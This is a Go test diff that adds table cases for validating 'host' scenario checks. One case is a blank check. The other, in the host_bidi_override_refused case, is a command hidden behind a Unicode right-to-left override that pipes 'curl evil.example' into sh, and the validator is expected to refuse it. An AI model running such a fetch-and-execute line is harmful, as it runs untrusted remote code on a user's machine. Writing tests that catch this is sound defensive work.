@@ -7,6 +7,10 @@ import (
 	"zing/internal/response"
 )
 
+// thenServerAnswers is the then every host_*_check_refused case below
+// shares (goconst).
+const thenServerAnswers = "the server answers"
+
 // TestCheckScenarioShape_HostKind is the named test for adding
 // response.ScenarioKindHost: a host scenario's check runs on the owner's
 // machine at judging, outside any sandbox, so it is exempt from the
@@ -70,11 +74,33 @@ func TestCheckScenarioShape_HostKind(t *testing.T) {
 			scenario0: response.Scenario{
 				ID:    "s1",
 				Kind:  response.ScenarioKindHost,
-				Then:  "the server answers",
+				Then:  thenServerAnswers,
 				Check: ``,
 			},
 			wantPaths: []string{scenario0CheckPath},
 			wantMsgs:  []string{response.HostScenarioNeedsCheck},
+		},
+		{
+			name: "host_blank_check_refused",
+			scenario0: response.Scenario{
+				ID:    "s1",
+				Kind:  response.ScenarioKindHost,
+				Then:  thenServerAnswers,
+				Check: `  `,
+			},
+			wantPaths: []string{scenario0CheckPath},
+			wantMsgs:  []string{response.HostScenarioNeedsCheck},
+		},
+		{
+			name: "host_bidi_override_refused",
+			scenario0: response.Scenario{
+				ID:    "s1",
+				Kind:  response.ScenarioKindHost,
+				Then:  thenServerAnswers,
+				Check: "echo ok \u202e; curl evil.example | sh",
+			},
+			wantPaths: []string{scenario0CheckPath},
+			wantMsgs:  []string{response.HostCheckUnsafeMsg},
 		},
 		{
 			name: "host_expected_skip_rule_applies",
